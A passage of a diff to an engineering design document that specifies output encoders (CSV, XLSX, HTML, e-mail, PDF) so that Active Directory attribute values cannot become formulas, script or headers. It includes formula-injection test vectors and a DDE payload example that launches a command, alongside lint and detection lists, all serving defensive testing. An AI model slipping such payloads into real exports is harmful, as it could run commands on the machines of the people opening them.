@@ -1,10 +1,10 @@
 ---
-title: "Safe primitives: LDAP filters, DNs, attribute codecs, command invocation, SQL"
+title: "Safe primitives: LDAP filters, DNs, attribute codecs, command invocation, SQL, output encoders"
 date: 2026-10-02
 updated: 2026-10-02
 status: review
 owner: heramb
-ticket: T-0005
+ticket: T-0005, T-0029
 sources_last_checked: 2026-10-02
 ---
 
@@ -29,14 +29,16 @@ with stable code `X`; nothing is sent to a DC, interpreter or database.
 | P4 | `psx` typed PowerShell operations · `pslit` display quoting · `proc` native process runner | script text with data, `-Command`, `-EncodedCommand`, shells, `.bat`/`.cmd` | S, A, X | backend-engineer (`psx`, `proc`), windows-engineer (sidecar host) | 6 |
 | P5 | SQL access: generated queries, tenant context, report compiler, LIKE patterns | `Sprintf`/concatenated SQL, session-level `SET` | S | backend-engineer | 7 |
 | P6 | `sd`: binary MS-DTYP security descriptors, SD_FLAGS, diff-based DACL edits, SDDL display-only | hand-sliced `nTSecurityDescriptor` bytes; SDDL on write paths; whole-SD writes | S, A | directory-engineer | sibling doc: `safe-primitives-security-descriptor.md` (T-0028) |
+| P7 | output encoders: `cellsafe` formula-lead classifier, CSV writer/reader, XLSX writer, HTML (`htmlx`, `msgtpl`, `httpx.Attachment`), e-mail composer, PDF writer | `encoding/csv` and joined rows, raw XLSX/PDF library calls, `text/template`, typed-string conversions, hand-built mail headers, HTML-to-PDF engines; in `web/`, DOM HTML sinks | S (tier W follows §12.5 W1–W5) | reporting-engineer (exports), backend-engineer (`htmlx`, `msgtpl`, mail) | 12 (T-0029) |
 
 Tier W (web console) implements **no** primitive and tier L (lab and tools) is exempt from the
 literal-shape ban but never imported by product code — both rules are in §2.1.
 
 Every ticket that implements or changes a primitive is tagged `security-sensitive`
 (`.claude/skills/security-baseline/SKILL.md` §1). Security descriptors are P6, specified in the sibling
-`safe-primitives-security-descriptor.md` (T-0028; it follows R1–R9 below). Out of scope here:
-output encoders for CSV/XLSX/HTML (T-0029), XML/SAML, JWT and randomness (feasibility §2.7 rows; T-0007).
+`safe-primitives-security-descriptor.md` (T-0028; it follows R1–R9 below). Output encoders are P7 (§12, T-0029).
+Out of scope here: SIEM and log encoders (CEF, syslog; T-0139), XML/SAML, JWT and randomness
+(feasibility §2.7 rows; T-0007).
 
 ## 1. Rules that apply to every primitive
 
@@ -79,14 +81,14 @@ library choice, the concrete lint tools and which tiers implement what. Package 
 provisional until T-0004 fixes the zone roots. API sketches use neutral pseudo-signatures; Go, C#
 and TypeScript names illustrate the ratified stack. §10 lists what changes if ADR-0001 is amended.
 
-| Tier (ADR-0001) | P1 filter | P2 DN / ObjectRef | P3 codecs, `Secret` | P4 command | P5 SQL |
-| --- | --- | --- | --- | --- | --- |
-| **S** server (Go) | implements | implements | implements | `psx` client, `pslit`, `proc` | implements |
-| **A** host agents (Go) | implements (same package) | implements | implements | `proc`; `psx` client only if a sidecar is declared | — |
-| **N** in-process DLLs (Rust) | — | — | `Secret` and only the codecs whose input it parses | none; process creation banned | — |
-| **X** sidecars (.NET + PowerShell) | consumes `FilterString` only | consumes GUIDs only | `SecureString` built from `Secret` bytes (§6.1) | `psx` host | — |
-| **W** web console (TypeScript) | **none**: shows the server's AST and rendered text | **none**: shows the server's `rdns` | **none**: shows server strings | **none**: shows `DisplayOnlyPowerShell` | none |
-| **L** lab and tools (Go, Python, PowerShell) | may hand-build hostile input | may hand-build hostile input | may hand-build hostile input | may hand-build hostile input | may hand-build hostile input |
+| Tier (ADR-0001) | P1 filter | P2 DN / ObjectRef | P3 codecs, `Secret` | P4 command | P5 SQL | P7 output |
+| --- | --- | --- | --- | --- | --- | --- |
+| **S** server (Go) | implements | implements | implements | `psx` client, `pslit`, `proc` | implements | implements |
+| **A** host agents (Go) | implements (same package) | implements | implements | `proc`; `psx` client only if a sidecar is declared | — | — |
+| **N** in-process DLLs (Rust) | — | — | `Secret` and only the codecs whose input it parses | none; process creation banned | — | — |
+| **X** sidecars (.NET + PowerShell) | consumes `FilterString` only | consumes GUIDs only | `SecureString` built from `Secret` bytes (§6.1) | `psx` host | — | — |
+| **W** web console (TypeScript) | **none**: shows the server's AST and rendered text | **none**: shows the server's `rdns` | **none**: shows server strings | **none**: shows `DisplayOnlyPowerShell` | none | **none**: renders server values as text; follows §12.5 W1–W5 |
+| **L** lab and tools (Go, Python, PowerShell) | may hand-build hostile input | may hand-build hostile input | may hand-build hostile input | may hand-build hostile input | may hand-build hostile input | may hand-build hostile files |
 
 ### 2.1 Tier W and tier L
 
@@ -103,7 +105,8 @@ carries only server-built values:
 | PowerShell | `DisplayOnlyPowerShell` rendered by Go `pslit` (§6.2) | nothing. The web never sends script text. |
 | SQL | nothing; report definitions are ASTs (§7 rule 3) | a report AST |
 
-Web code renders these values as text through React's default escaping. HTML/CSV encoders are T-0029.
+Web code renders these values as text through React's default escaping. Output encoding (HTML, CSV,
+XLSX, e-mail, PDF) is P7 (§12); the console's own rules are §12.5 W1–W5.
 FF-SP3 covers `web/` (§8).
 
 **Tier L** (`lab/`, `tools/`) may build hostile inputs by hand: that is how corpora, fuzz seeds and
@@ -1060,15 +1063,19 @@ and is updated by the lab tests, not by hand.
 - `attr.unicodepwd` (incl. `Secret`, `SecureConn`);
 - `psx`, `pslit`, `proc`;
 - `sql`;
+- `cellsafe`, `csv`, `xlsx`, `html`, `mail`, `pdf` (P7, §12);
 - `sd.read`, `sd.write` (P6, defined in `safe-primitives-security-descriptor.md` §5; its rules FF-SD1–5 each have a named owner in that document §6: T-0118 for FF-SD1/2 and the `sd.read` half of FF-SD5, T-0138 for FF-SD3/4, T-0135 for the `sd.write` half; the T-0033/T-0034 harness hosts them).
 
 A **record is one input**. A table row listing several inputs separated by `·`, `/` or commas
 expands to one record each, with suffixed IDs, paired in order with the expected values. Separators
 count only between inputs, never inside a code span. For example, FT-13 becomes `FT-13#1` …
 `FT-13#6`; FL-12 and GT-07 expand the same way. Every record carries an explicit
-`"hostile": true|false`; it is never inferred. Static vectors (LF-30, PROC-10, SQL-17/18, PSX-18)
-are records with `"kind":"static"`. FF-SP1–3, FF-SP7 (inside T-0036) or FF-SP9 check them instead
-of a runtime call.
+`"hostile": true|false`; it is never inferred. Static vectors (LF-30, PROC-10, SQL-17/18, PSX-18;
+in P7 XL-16, HT-05 to -08, HT-19, HT-20, EM-13 to -15, PDF-11, PDF-12) are records with
+`"kind":"static"`. FF-SP1–3, FF-SP7 (inside T-0036), FF-SP9 or FF-SP10 check them instead of a
+runtime call. P7 adds two kinds: `"kind":"lab"` (CSV-17, CSV-18, XL-18), which FF-SP11 runs
+in a spreadsheet application, and `"kind":"e2e"` (HT-18, HT-21, HT-22), which the server
+integration and Playwright suites run.
 
 **Hostile** means a correct implementation must reject, neutralise or refuse the input. That covers:
 - injection metacharacters and look-alike characters;
@@ -1096,6 +1103,12 @@ counts:
 | `pslit` | 19 | 16 | PSQ-14#1–2, -16 |
 | `proc` | 35 | 35 | none |
 | `sql` | 29 | 28 | SQL-14 |
+| `cellsafe` | 42 | 35 | CS-17 to -20, CS-21#1–2, CS-22 |
+| `csv` | 26 | 21 | CSV-20 to -22, CSV-23#1–2 |
+| `xlsx` | 27 | 24 | XL-19 to -21 |
+| `html` | 41 | 39 | HT-23, -24 |
+| `mail` | 19 | 17 | EM-16, -17 |
+| `pdf` | 19 | 17 | PDF-13, -14 |
 
 The margins are smallest for `attr.gentime` and `attr.flags`, at 12 each. A change that removes or
 reclassifies a hostile record in either unit adds a replacement in the same change, or FF-SP4
@@ -1104,15 +1117,17 @@ authoritative and FF-SP4 recomputes the counts.
 
 | FF | Check | Fails when |
 | --- | --- | --- |
-| FF-SP1 | Import boundaries | any of these outside its home: the LDAP library and raw search/controls (only `scope` and the connector); the SQL driver (only the data-access package of ADR-0002, path per T-0004); process APIs (only `proc`); the PowerShell SDK (only the sidecar host). Also: any product package importing `lab/…` or `tools/…` (tier L). Enforced with depguard, BannedApiAnalyzers and clippy |
-| FF-SP2 | Banned APIs and custom analyzers | any symbol in the per-primitive lists in §3.5, §4.6, §5, §6, §7. Includes TLS-verification bypasses (§5.6), `net/http/pprof` and `runtime/pprof` outside tests and tier L, and `GOTRACEBACK=crash` in service definitions. The go/analysis passes `dnstring`, `sqlconst` and `secretjson` run here (`go vet -vettool`, T-0033) |
-| FF-SP3 | Literal-shape scanner | filter-, DN-, PowerShell- or SQL-shaped literals combined with concatenation or formatting outside primitive packages and tests. **`web/` is covered too**: TS/TSX template literals or concatenations containing `CN=`, `OU=`, `DC=`, `(&(`, `(\|(` or `(objectClass=`; quote doubling (`replace(/'/g, "''")`, `replaceAll("'", "''")`); `.split(',')`, `.endsWith(` or `.includes(` on a value named `dn`/`distinguishedName`. Tier L is exempt (§2.1). Tool: Semgrep or ast-grep, chosen by devops-engineer via the licence register |
+| FF-SP1 | Import boundaries | any of these outside its home: the LDAP library and raw search/controls (only `scope` and the connector); the SQL driver (only the data-access package of ADR-0002, path per T-0004); process APIs (only `proc`); the PowerShell SDK (only the sidecar host). Also: any product package importing `lab/…` or `tools/…` (tier L). P7 adds: `encoding/csv` (only `export/csv`), the XLSX library (only `export/xlsx`), the PDF library (only `export/pdf`), `net/smtp`/`mime/multipart` (only `notify/mail`), any HTML-to-PDF or headless-browser module anywhere in product code (§12.3–§12.7). Enforced with depguard, BannedApiAnalyzers and clippy |
+| FF-SP2 | Banned APIs and custom analyzers | any symbol in the per-primitive lists in §3.5, §4.6, §5, §6, §7. Includes TLS-verification bypasses (§5.6), `net/http/pprof` and `runtime/pprof` outside tests and tier L, and `GOTRACEBACK=crash` in service definitions. The go/analysis passes `dnstring`, `sqlconst` and `secretjson` run here (`go vet -vettool`, T-0033). P7 adds the §12.4–§12.7 lists (`text/template`, typed-string conversions outside `htmlx`, the `tmplconst` pass, `SetEscapeHTML(false)`, `Content-Disposition` outside `httpx`, XLSX formula/hyperlink/VBA setters, PDF link/JavaScript/attachment/page-import APIs) |
+| FF-SP3 | Literal-shape scanner | filter-, DN-, PowerShell- or SQL-shaped literals combined with concatenation or formatting outside primitive packages and tests. **`web/` is covered too**: TS/TSX template literals or concatenations containing `CN=`, `OU=`, `DC=`, `(&(`, `(\|(` or `(objectClass=`; quote doubling (`replace(/'/g, "''")`, `replaceAll("'", "''")`); `.split(',')`, `.endsWith(` or `.includes(` on a value named `dn`/`distinguishedName`; P7's §12.5 W1/W2 ESLint rules and CSV/XLSX `Blob`s. **P7 shapes in Go:** formula-lead `HasPrefix` checks outside `cellsafe`, joined CSV rows, `"text/csv"`/`".csv"` outside `export/csv`/`httpx`, HTML-shaped literals outside `htmlx`, mail-header literals outside `notify/mail` (§12.2–§12.6). Tier L is exempt (§2.1). Tool: Semgrep or ast-grep, chosen by devops-engineer via the licence register |
 | FF-SP4 | Corpus gate | a **unit** (§8 list) has < 10 records with `"hostile": true`; an implementation skips records of a unit it implements; a record disappears without a superseding one |
-| FF-SP5 | Fuzz | each parser/encoder lacks a corpus-seeded fuzz target; nightly ≥ 10 min each; properties `parse(render(x)) == x` and "render never emits an unescaped special" |
+| FF-SP5 | Fuzz | each parser/encoder lacks a corpus-seeded fuzz target; nightly ≥ 10 min each; properties `parse(render(x)) == x` and "render never emits an unescaped special". P7: `csv.Read(csv.Write(v)) == v`; no CSV cell starts with an un-neutralised `FormulaLead`; every XLSX, HTML, MIME and PDF output parses with an independent parser (§12.3–§12.7) |
 | FF-SP6 | Oracles | PowerShell parser oracle (`pslit`); LDAP library round-trip (P1); Samba lab integration (P1–P3); Windows lab nightly for the rows in §9 marked Windows. **SID/GUID oracle, Windows runner:** SID text → bytes via `ConvertStringSidToSidW` and bytes → text via `ConvertSidToStringSidW`; GUID text → bytes via .NET `Guid.Parse` + `ToByteArray()` and bytes → text via `StringFromGUID2`. The relation is: **every input we accept, Windows accepts, and on every accepted input the bytes (and the rendered text) are equal**. We may reject more. Intentional strictness: SID-09 (leading zeros), SID-10 (hex authority below 2^32), GUID-05 (undashed, accepted only inside `ObjectRef`), GUID-08 (nil), GUID-10 (whitespace; `Guid.Parse` trims). If Windows rejects an input we accept (candidate: SID-03's lower-case `s-`), we tighten ours; the relation wins over our reading of the ABNF |
 | FF-SP7 | Tenancy | **Implemented once, inside ADR-0002's `fitness-tenancy` job (T-0036, checks T2–T4). This row is the list T-0036 must cover.** Against the migrated schema it fails when: a tenant table lacks RLS + FORCE; a view lacks `security_invoker=true` (`pg_class.reloptions`); a materialized view or `SECURITY DEFINER` function (`pg_proc.prosecdef`) depends on a tenant table; the app (runtime) or owner (migration) role has `rolsuper` or `rolbypassrls`; the app role owns a table; a policy's `qual` differs from the rule-10 shape (no `coalesce`, `OR` or `true`); SQL-13, -14, -17 to -20 fail |
 | FF-SP8 | Constant argv | for random requests, `psx`/`proc` argv differs from the manifest's constant argv |
 | FF-SP9 | `psx` manifest | built against the real module metadata (the `CommandInfo.Parameters` of each pinned module) in the sidecar build. Fails when: an op's `Identity` parameter is not bound from a `Guid`; `LDAPFilter` is bound from anything but P1 `FilterString`; a `Filter`, `RecipientFilter`, `FilterScript`, `ScriptBlock` or other OPATH/script parameter is bound at all; a parameter carrying a secret is not `SecureString`/`PSCredential` (PSX-18); an op names a command not exported by its pinned module (PSX-16) |
+| FF-SP10 | Output structure oracle (P7) | for any `csv`/`xlsx`/`html`/`mail`/`pdf` record, the artefact parsed by an independent parser violates its section's structure rules. CSV: field and row counts equal the model; no cell starts with a raw lead. XLSX: XL-16. HTML: no `script` element, no `on*` attribute, no non-`SystemURL` link, CSP meta first. Mail: header set as built, QP/base64 parts, no line over 998 octets, no bare CR/LF. PDF: §12.7 rule 3 names absent, extracted text equals input. Also: the `FormulaLeadTable` generator output differs from the committed table, or an embedded template breaks §12.5 rule 3 |
+| FF-SP11 | Spreadsheet application oracle (P7) | every push: headless LibreOffice (dev tooling only; devops-engineer checks the licence register) imports each `csv`/`xlsx` output with formula evaluation enabled and finds any formula cell, or a displayed value different from the expected text. Nightly on the Windows lab: Excel does the same, plus CSV-17 (save as CSV, reopen), CSV-18 (`;` list separator) and XL-18 (edit a `quotePrefix` cell) |
 
 ## 9. Verification status and Samba false-pass risks
 
@@ -1140,6 +1155,11 @@ except the PowerShell quoting rules, which are confirmed in PowerShell's source 
 | `runtime/secret` protection | Go docs: linux/amd64, linux/arm64 only | Linux | n/a — no effect on Windows |
 | SASL GSSAPI sealing as a `SecureConn` source | `[UNVERIFIED]` (T-0023) | Samba + Windows | medium |
 | PostgreSQL `security_invoker`, materialized-view and `SECURITY DEFINER` RLS behaviour | PostgreSQL docs | PostgreSQL 16 and 18 in CI | n/a |
+| P7: TAB-in-quotes keeps a lead cell as text in Excel, also after save-as-CSV and reopen (CSV-17) | [WSTG-INJT-21][wstg-csv] "observed behavior" | **Excel (Windows lab)** + LibreOffice | n/a: no spreadsheet on Samba; LibreOffice may differ from Excel, so both run |
+| P7: full-width and other look-alike leads, leading invisible characters, U+2212: does any spreadsheet evaluate them? (§12.2) | `[UNVERIFIED — lab]`; WSTG "depending on locale" | Excel (ja-JP and en-US locales) + LibreOffice | n/a: we neutralise regardless; the lab result only tells us if we over-neutralise |
+| P7: comma CSV under a `;` list separator; `sep=` after a BOM; UTF-8 BOM needed (CSV-13, CSV-18; §12.3 rule 4) | `[UNVERIFIED — lab]` | Excel + LibreOffice | n/a |
+| P7: `quotePrefix` keeps a cell text on edit; `History` is a reserved sheet name (XL-18, XL-13) | Open XML SDK docs; `[UNVERIFIED — lab]` | Excel | n/a |
+| P7: Trusted Types enforced in the supported browsers (HT-22) | URIports, web.dev; `[UNVERIFIED — check MDN compat at build]` | Playwright: Chromium, Firefox, WebKit | n/a |
 
 ## 10. Stack binding (ADR-0001 ratified) and what changes if it is amended
 
@@ -1152,6 +1172,7 @@ except the PowerShell quoting rules, which are confirmed in PowerShell's source 
 | Processes | `proc` contract, PROC vectors | Go `proc` + `x/sys/windows`; `ArgumentList` inside the sidecar | — |
 | SQL | rules 1–13, SQL vectors | pgx v5 + sqlc + RLS; simple protocol banned; the tenancy API (`WithTenant`/`WithPlatform`, exemption registry, role split) is owned by ADR-0002 | SQL Server would need its own section (RLS semantics differ) |
 | Lint tools | rule meaning, FF-SP1–9 | golangci-lint (forbidigo, depguard, gosec), go/analysis passes `dnstring`/`sqlconst`/`secretjson`, BannedApiAnalyzers, clippy, PSScriptAnalyzer for `lab/`/`tools/`, Semgrep or ast-grep for FF-SP3 incl. `web/` | equivalents per language |
+| Output encoders (P7) | classifier table, CSV neutraliser and reader inverse, XLSX/HTML/mail/PDF rules, CS/CSV/XL/HT/EM/PDF vectors | Go `export/…`, `htmlx`, `msgtpl`, `notify/mail`; `html/template`; XLSX and PDF libraries chosen by T-0101/T-0102 through the licence register; ESLint for tier W | a .NET or other server re-implements the same contract and runs the same corpus |
 | Web console | tier W implements no primitive (§2.1); API carries server-built values | TypeScript + React under `web/`; FF-SP3 scans it | if a second UI technology were allowed, it inherits §2.1 unchanged |
 | Paths | provisional names above | T-0004 sets the roots; `ad-engineering` skill paths updated with them | — |
 
@@ -1165,7 +1186,8 @@ T-0034 (FF-SP4–6, 8) and T-0036 (FF-SP7, implemented inside ADR-0002's `fitnes
 ## 11. Follow-ups
 
 - T-0028 — typed security-descriptor primitive: done as `safe-primitives-security-descriptor.md`; build in T-0118 (read half), T-0135 (write half), T-0137 (SDDL display), T-0138 (FF-SD3/4 analyzers).
-- T-0029 — output encoders (CSV/XLSX formula neutralisation, HTML, email/PDF).
+- T-0029 — output encoders: done as §12 (P7). Builds: T-0101 (`cellsafe`, CSV, XLSX), T-0102 (PDF, HTML export), T-0095 (`msgtpl`, mail composer); FF-SP10 goes to T-0034 and FF-SP11 to T-0034 plus the Windows lab nightly; the P7 lint lists extend T-0033.
+- T-0139 — SIEM and log output encoders (CEF, syslog, JSON lines), left out of §12.
 - T-0033 / T-0034 — fitness implementation (static rules FF-SP1–3, 9; corpus, fuzz and oracles FF-SP4–6, 8).
 - T-0036 — FF-SP7, inside ADR-0002's `fitness-tenancy` job (checks T2–T4); §8's FF-SP7 row is its coverage list.
 - T-0037 — tenancy foundation (`WithTenant`/`WithPlatform`, exemption registry); builds §7 rule 11 as ADR-0002 specifies.
@@ -1175,6 +1197,537 @@ T-0034 (FF-SP4–6, 8) and T-0036 (FF-SP7, implemented inside ADR-0002's `fitnes
 - T-0023 — whether GSSAPI sealing can be a `SecureConn` source (§5.6).
 - OPATH (Exchange) filter primitive: none planned. OPATH parameters stay banned for data (§6.1 rule 2)
   until the M365 parity scope needs one.
+
+## 12. P7 — Output encoders (T-0029)
+
+**Threat.** AD attributes are attacker-controlled. A low-privilege user (TM-X3) can write some
+attributes on their own object, and a hostile migration source (TM-X13) controls whole files. Those
+values flow into the console, report exports, scheduled e-mail and PDFs that a privileged admin
+opens. Four results follow: formula execution in the admin's spreadsheet (TM-TB15-T1), stored XSS in
+the console (TM-TB1-T4), header or SMTP injection in our mail (TB9), and a spoofed or active PDF.
+Report and export paths are where the competitor's injection bugs cluster: the ADAudit Plus row
+of 28 SQL-injection fixes in 2024 lists "reports, dashboards, alerts and exports"
+(`knowledge/business/market-research/manageengine-ad-customer-voice-and-security.md` §4.1). That
+class is SQL, which P5 covers, but the lesson carries over: the output side of a report needs the
+same typed discipline.
+Feasibility §2.7 names the control ("a `csvx`/`xlsx` writer that neutralizes formula-leading cells;
+email/PDF through the same encoders"). This section specifies it.
+
+**Guarantee.** Data in an output is always data. No attribute value can become a formula, markup,
+script, header, MIME part, SMTP command, PDF operator, link or file name extension. Every encoder
+takes a typed model and never text that has data spliced into it. Each encoder has one package, an
+API sketch, a hostile-vector table, and a lint rule that bans the raw writer it replaces.
+
+**Notation for §12.** Inside §12 tables, `\t`, `\r`, `\n`, `\xNN` and `\uXXXX` denote the single
+character in inputs **and** expected outputs, unlike §3–§7. The one exception, PDF-02, says so
+itself. `⟨U+XXXX⟩` is the visible token defined in O3.
+
+| Encoder | Package (provisional; T-0004 fixes roots) | Replaces (banned) | Tier | Build ticket | § |
+| --- | --- | --- | --- | --- | --- |
+| Formula-lead classifier | `export/cellsafe` | ad-hoc `strings.HasPrefix(v, "=")` checks | S | T-0101 | 12.2 |
+| CSV writer and its inverse reader | `export/csv` | `encoding/csv`, `strings.Join(…, ",")`, `fmt.Fprintf` rows | S | T-0101 | 12.3 |
+| XLSX writer | `export/xlsx` | direct XLSX library use, formulas, hyperlinks | S | T-0101 | 12.4 |
+| HTML: server templates, HTML export, admin message templates, download headers; console rules | `platform/htmlx`, `platform/httpx`, `platform/msgtpl`; `web/` rules | `text/template`, typed-string conversions, hand-set `Content-Disposition`; `dangerouslySetInnerHTML` and DOM sinks | S (+ W rules) | T-0102 (export), T-0095 (templates), console tickets | 12.5 |
+| E-mail composer | `platform/notify/mail` | `net/smtp`, hand-written headers, `mime/multipart` | S | T-0095 | 12.6 |
+| PDF writer | `export/pdf` | direct PDF library use, any HTML-to-PDF engine | S | T-0102 | 12.7 |
+
+### 12.1 Rules that apply to every output encoder
+
+R1–R9 (§1) apply. They are written for inputs, so O1–O8 below say how each applies at the output
+boundary.
+
+- **O1 Typed model in, bytes out.** Tabular encoders consume a `Table` of typed `Cell`s. Messages
+  consume a parsed `MessageTemplate` plus a value map. Pages consume a compiled `html/template`
+  plus data. No encoder accepts a pre-rendered fragment (R2), and no API takes a `[]string` row, a
+  header string or an HTML string.
+- **O2 Encode once, at the sink, for its context.** Values are stored and passed raw. A value that
+  was "escaped earlier" is a defect: it is either double-encoded or trusted where it should not be.
+- **O3 Preserve where the format can carry it; map visibly where it cannot.** CSV and XLSX carry
+  every Unicode scalar, so they keep data exactly. The only change is the CSV neutraliser (§12.3),
+  which our reader reverses. Contexts that cannot carry a character safely map it **visibly**,
+  never by silent deletion, and count it in the `RenderReport`:
+
+  | Context | Characters mapped | Replacement |
+  | --- | --- | --- |
+  | Single-line header values (e-mail `Subject`, display names) | Cc, U+2028, U+2029 | U+FFFD |
+  | File names (download, attachment, sheet name) | Cc, Cf, `\ / : * ? " < > \|`, `%` and, in sheet names, `[ ]` | `_` |
+  | PDF text | Cc except `\n` in multi-line cells; Cf (bidi controls, zero-width and other format characters) | `⟨U+XXXX⟩`, rendered as visible text |
+
+  R3 ("reject, never repair") governs **inputs**: a repaired password is a different password. A
+  rendered label is not an input, and refusing to deliver a password-expiry notice because a
+  user's `displayName` holds a control character would let any user suppress their own alerts.
+  Rendering fails only on caps (O7) and on programming errors such as unknown placeholders.
+- **O4 One classifier.** "Could a spreadsheet treat this as a formula?" has exactly one
+  implementation, `cellsafe.Classify` (§12.2), used by the CSV writer, the XLSX writer and the CSV
+  reader's inverse.
+- **O5 No active content, ever.** No encoder can emit a formula, hyperlink, script, macro, external
+  reference, remote resource, PDF action or form. The format feature is absent from the encoder's
+  API, not filtered out after the fact. Totals and derived values are computed on the server and
+  written as typed numbers.
+- **O6 Bidi isolation in display contexts.** Attacker text containing U+202E and friends must not
+  reorder the text around it. HTML wraps every data value in `<bdi>` ([MDN `<bdi>`][mdn-bdi]). The
+  console's table and detail components do the same (§12.5). PDF shows bidi controls as `⟨U+XXXX⟩`
+  (O3). CSV and XLSX keep the data (O3), and the spreadsheet application is responsible for display.
+- **O7 Bounded and streaming** (R5, TM-TB15-T8). Writers stream row by row. Caps are named
+  constants. The values below are provisional until load tests: CSV and XLSX 1 048 575 data rows,
+  the Excel sheet maximum less the header row; 32 767 UTF-16 code units per cell, the Excel cell
+  limit ([Excel limits][excel-limits]); PDF 100 000 rows and 200 lines per cell; e-mail subject 200
+  characters, 25 MiB per message. An over-long **cell** is cut on a scalar boundary and ends with
+  the marker `… [truncated: N chars]`. That is visible and counted, never silent. An over-long
+  **export** fails with `RowCapExceeded` before the job starts writing, and the UI offers a
+  narrower filter.
+- **O8 Every encoder returns a `RenderReport`** `{rows, neutralised, mapped, truncated}`. The export
+  and delivery audit events (TM-TB15-T6, AG-8) record it, so an auditor can see that a file was
+  neutralised and how often.
+
+**Tier binding.** Only tier S implements P7. Tiers A, N and X produce no human-facing files and
+import none of these packages (FF-SP1). Tier W implements **no** encoder: it never assembles CSV,
+XLSX, HTML or e-mail text. Every download, the "copy rows" action included, is a server export
+(§12.5 rule W5). Tier L may hand-build hostile files (§2.1).
+
+### 12.2 `cellsafe` — the formula-lead classifier
+
+```
+Classify(s: string) -> Plain | FormulaLead
+FormulaLeadTable            // generated, committed, reviewed; pinned to a Unicode version
+```
+
+`Classify(s)` returns `FormulaLead` when either of these holds:
+
+1. the first scalar of `s` is TAB (U+0009), CR (U+000D) or LF (U+000A) ([OWASP][owasp-csv];
+   [WSTG-INJT-21][wstg-csv]); or
+2. after skipping leading scalars that are Unicode `White_Space`, general category `Cc` or general
+   category `Cf`, the first remaining scalar is in `FormulaLeadTable`.
+
+`FormulaLeadTable` holds every code point whose NFKC normalisation starts with `=`, `+`, `-`, `@`
+or U+2212 MINUS SIGN. NFKC is used **only to build the table**: no value is ever normalised (R4).
+Under Unicode 16.0 the table has 22 entries, generated with Python's `unicodedata.normalize`:
+`+ - = @`, U+207A–U+207C, U+208A–U+208C, U+2212, U+2A75, U+2A76, U+FB29, U+FE62, U+FE63, U+FE66,
+U+FE6B, U+FF0B, U+FF0D, U+FF1D, U+FF20. The generator runs in CI with Go's
+`golang.org/x/text/unicode/norm` and fails when its output differs from the committed table.
+U+2212 is included conservatively: whether any spreadsheet treats it as an operator is
+`[UNVERIFIED — lab]`.
+
+Why each part is there:
+
+- **The four ASCII leads and TAB, CR and LF** are the OWASP/WSTG list. Full-width `＝ ＋ － ＠`
+  "may be interpreted as formulas … depending on locale/application behavior" ([WSTG][wstg-csv]).
+  The other compatibility forms (small, superscript and subscript signs) are the same class of
+  look-alike, and the generated table covers them without a hand-kept list.
+- **The skip set** exists because a leading space, NBSP, ideographic space, zero-width space, BOM
+  or bidi control is invisible to the admin. Whether a spreadsheet skips any of them before
+  deciding "formula" is `[UNVERIFIED — lab]` (FF-SP11). Classifying them as leads costs little
+  and removes the question.
+- **`|`, `%` and `'` are not leads.** DDE payloads need a leading `=`, `+`, `-` or `@`
+  (`=cmd|' /C calc'!A0`). A leading `'` is the spreadsheet's own text marker. Neither OWASP nor
+  WSTG lists these characters (CS-21, CS-18).
+
+| ID | Input | Expected | Why |
+| --- | --- | --- | --- |
+| CS-01 | `=1+1` | `FormulaLead` | ASCII equals |
+| CS-02 | `+1+1` | `FormulaLead` | ASCII plus |
+| CS-03 | `-1+1` | `FormulaLead` | ASCII minus |
+| CS-04 | `@SUM(1,1)` | `FormulaLead` | at-sign (Lotus-style function) |
+| CS-05 | `\t=1+1` | `FormulaLead` | leading TAB ([WSTG][wstg-csv]) |
+| CS-06 | `\r=1+1` · `\n=1+1` | `FormulaLead` | leading CR, LF |
+| CS-07 | `＝1+1` (U+FF1D) | `FormulaLead` | full-width equals |
+| CS-08 | `＋1+1` (U+FF0B) · `－1+1` (U+FF0D) · `＠SUM(1,1)` (U+FF20) | `FormulaLead` | full-width plus, minus, at |
+| CS-09 | `﹦1+1` (U+FE66) · `﹢1` (U+FE62) · `﹣1` (U+FE63) · `﹫A1` (U+FE6B) | `FormulaLead` | small-form variants |
+| CS-10 | `⁼1` (U+207C) · `₌1` (U+208C) · `⁺1` (U+207A) · `₊1` (U+208A) · `⁻1` (U+207B) · `₋1` (U+208B) | `FormulaLead` | super/subscript signs |
+| CS-11 | `−1+1` (U+2212) | `FormulaLead` | minus sign, included conservatively |
+| CS-12 | ` =1+1` · ` =1+1` · `　=1+1` | `FormulaLead` | leading space, NBSP, ideographic space |
+| CS-13 | `​=1+1` · `﻿=1+1` · `‮=1+1` · `­=1+1` · `⁠=1+1` | `FormulaLead` | invisible `Cf` before the lead |
+| CS-14 | `\x01=1+1` · `\x1F+1` | `FormulaLead` | other C0 controls are skipped |
+| CS-15 | `=` | `FormulaLead` | a lone lead |
+| CS-16 | `⩵1` (U+2A75) · `﬩1` (U+FB29) | `FormulaLead` | rarer NFKC-derived leads |
+| CS-17 | `x=1+1` | `Plain` | only the start of a cell matters |
+| CS-18 | `'=1+1` | `Plain` | the spreadsheet's own text marker |
+| CS-19 | `１２３` (U+FF11–U+FF13) | `Plain` | full-width digits are not leads |
+| CS-20 | `` (empty) | `Plain` | empty cell |
+| CS-21 | `\|calc` · `%1` | `Plain` | not cell-start triggers (see above) |
+| CS-22 | `🙂=1` | `Plain` | a visible symbol first |
+
+**Lint.** `strings.HasPrefix`/`TrimLeft` on values with `"="`, `"+"`, `"-"` or `"@"` literals in
+`export/…` or `reports/…` outside `cellsafe` is a finding (FF-SP3). Only `cellsafe` decides.
+
+### 12.3 `export/csv` — CSV writer and reader
+
+```
+csv.NewWriter(w: io.Writer, o: CSVOptions{Delimiter: Comma | Semicolon, BOM: bool = true}) -> Writer
+Writer.Header(cols: []Column) -> Error        // labels go through the same cell rules
+Writer.Row(cells: []Cell) -> Error            // Cell = Text | Int64 | Float64 | Bool | Time | Never | Empty | Multi
+Writer.Close() -> RenderReport
+csv.NewReader(r: io.Reader, o: CSVOptions, l: Limits) -> Reader   // RT-13 parser; reverses the neutraliser
+Reader.Row() -> []string | Error
+```
+
+There is no `WriteRaw`, no `[]string` row and no TAB delimiter.
+
+**Rules.**
+
+1. **Quote every text field** and double every `"` inside it (RFC 4180, [OWASP][owasp-csv]). A
+   value cannot add a field or a row for any quote-aware parser, whatever delimiter it uses. Typed
+   numbers, booleans and times are written unquoted, in invariant culture.
+2. **Neutralise by prefixing TAB inside the quotes** when `Classify(v) == FormulaLead`: `=1+1` is
+   written as `"\t=1+1"`. We choose TAB over `'`, the older OWASP advice, because "Microsoft Excel
+   may remove quotes or escape characters from CSV cells when a file is saved and re-opened", while
